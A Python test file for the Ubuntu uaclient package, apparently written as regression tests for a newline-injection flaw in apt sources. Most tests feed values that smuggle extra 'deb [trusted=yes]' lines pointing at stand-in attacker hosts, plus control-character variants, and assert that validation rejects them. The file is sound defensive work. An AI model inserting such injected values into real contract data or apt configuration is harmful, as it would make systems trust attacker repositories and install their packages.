"""Tests for newline/control-character injection prevention."""

import pytest

from uaclient.contract_data_types import (
    Directives,
    Entitlement,
    PublicMachineTokenData,
)
from uaclient.data_types import (
    IncorrectFieldTypeError,
    IncorrectListElementTypeError,
    IncorrectTypeError,
    StrictStringDataValue,
    data_list,
)


class TestStrictStringDataValue:
    """StrictStringDataValue rejects control characters.

    Regression tests for CVE-2026-11386 (newline injection in apt
    sources via contract directives).
    """

    @pytest.mark.parametrize(
        "val",
        (
            "hello",
            "jammy",
            "jammy-updates",
            "https://esm.ubuntu.com/infra/ubuntu",
            "my-package-name",
            "a" * 500,
        ),
    )
    def test_accepts_valid_strings(self, val):
        assert StrictStringDataValue.from_value(val) == val

    @pytest.mark.parametrize(
        "val",
        (
            "jammy\ndeb [trusted=yes] http://evil.example.com/repo jammy main",
            "https://esm.ubuntu.com\nhttps://evil.example.com",
            "value\rinjection",
            "value\x00injection",
            "\n",
            "\r",
            "\x00",
            "jammy main\ndeb http://attacker/ jammy main",
            "[trusted=yes] http://evil.example.com/repo",
            "jammy main",
            " ",
        ),
    )
    def test_rejects_control_characters(self, val):
        with pytest.raises(IncorrectTypeError) as exc_info:
            StrictStringDataValue.from_value(val)
        assert "control characters" in exc_info.value.msg

    @pytest.mark.parametrize("val", (1, True, [], {}))
    def test_rejects_non_strings(self, val):
        with pytest.raises(IncorrectTypeError):
            StrictStringDataValue.from_value(val)


class TestStrictStringDataValueInList:
    """data_list(StrictStringDataValue) rejects injection in list items.

    Regression tests for CVE-2026-11386 (newline injection in apt
    sources via contract directives).
    """

    def test_valid_list_passes(self):
        strict_list = data_list(StrictStringDataValue)
        result = strict_list.from_value(["jammy", "jammy-updates"])
        assert result == ["jammy", "jammy-updates"]

    def test_newline_in_list_item_raises(self):
        strict_list = data_list(StrictStringDataValue)
        with pytest.raises(IncorrectListElementTypeError):
            strict_list.from_value(
                ["jammy", "jammy\ndeb [trusted=yes] http://evil/ jammy main"]
            )


def _make_machine_token(directives):
    """Build a minimal but structurally valid machine-token dict."""
    return {
        "machineTokenInfo": {
            "contractInfo": {
                "resourceEntitlements": [
                    {
                        "type": "esm-infra",
                        "entitled": True,
                        "obligations": {"enableByDefault": True},
                        "directives": directives,
                        "affordances": {},
                        "overrides": [],
                    }
                ]
            }
        }
    }


class TestMaliciousContractResponseRejected:
    """End-to-end: malicious contract responses are rejected during
    deserialization before any apt sources file is written.

    These tests exercise the full chain:
      raw JSON dict
        -> PublicMachineTokenData.from_dict()
          -> Entitlement.from_dict()
            -> Directives.from_dict()
              -> StrictStringDataValue.from_value()  # raises
    """

    def test_newline_in_suites_rejected_by_full_chain(self):
        """PoC from CVE report: newline in suites injects a trusted repo."""
        token = _make_machine_token(
            {
                "aptURL": "https://esm.ubuntu.com/infra/ubuntu",
                "aptKey": "APTKEY",
                "suites": [
                    "jammy\ndeb [trusted=yes] http://attacker.example.com"
                    "/repo jammy main"
                ],
            }
        )
        with pytest.raises(IncorrectTypeError):
            PublicMachineTokenData.from_dict(token)

    def test_newline_in_apt_url_rejected_by_full_chain(self):
        """Newline in aptURL injects an additional sources line."""
        token = _make_machine_token(
            {
                "aptURL": "https://esm.ubuntu.com/infra/ubuntu\n"
                "deb [trusted=yes] http://evil.example.com/repo",
                "aptKey": "APTKEY",
                "suites": ["jammy"],
            }
        )
        with pytest.raises(IncorrectTypeError):
            PublicMachineTokenData.from_dict(token)

    def test_newline_in_additional_packages_rejected_by_full_chain(self):
        """Newline in additionalPackages is rejected."""
        token = _make_machine_token(
            {
                "aptURL": "https://esm.ubuntu.com/infra/ubuntu",
                "aptKey": "APTKEY",
                "suites": ["jammy"],
                "additionalPackages": ["legit-pkg\nevil-pkg"],
            }
        )
        with pytest.raises(IncorrectTypeError):
            PublicMachineTokenData.from_dict(token)

    def test_carriage_return_in_suites_rejected_by_full_chain(self):
        token = _make_machine_token(
            {
                "aptURL": "https://esm.ubuntu.com/infra/ubuntu",
                "aptKey": "APTKEY",
                "suites": ["jammy\revil"],
            }
        )
        with pytest.raises(IncorrectTypeError):
            PublicMachineTokenData.from_dict(token)

    def test_null_byte_in_apt_url_rejected_by_full_chain(self):
        token = _make_machine_token(
            {
                "aptURL": "https://esm.ubuntu.com\x00/evil",
                "aptKey": "APTKEY",
                "suites": ["jammy"],
            }
        )
        with pytest.raises(IncorrectTypeError):
            PublicMachineTokenData.from_dict(token)

    def test_clean_contract_response_accepted(self):
        """A well-formed contract response passes validation."""
        token = _make_machine_token(
            {
                "aptURL": "https://esm.ubuntu.com/infra/ubuntu",
                "aptKey": "APTKEY",
                "suites": ["jammy", "jammy-updates"],
            }
        )
        result = PublicMachineTokenData.from_dict(token)
        ent = result.machineTokenInfo.contractInfo.resourceEntitlements[0]
        assert ent.directives.aptURL == "https://esm.ubuntu.com/infra/ubuntu"
        assert ent.directives.suites == ["jammy", "jammy-updates"]

    def test_directives_from_dict_rejects_injection_directly(self):
        """Directives.from_dict() rejects newline injection."""
        with pytest.raises(IncorrectFieldTypeError):
            Directives.from_dict(
                {
                    "aptURL": "https://good.example.com",
                    "suites": [
                        "jammy\ndeb [trusted=yes] http://evil/ jammy main"
                    ],
                }
            )

    def test_entitlement_from_dict_rejects_injection(self):
        """Entitlement.from_dict() rejects injected directives."""
        with pytest.raises(IncorrectFieldTypeError):
            Entitlement.from_dict(
                {
                    "type": "esm-infra",
                    "entitled": True,
                    "directives": {
                        "aptURL": "https://good.example.com\nhttps://evil.com",
                        "suites": ["jammy"],
                    },
                }
            )
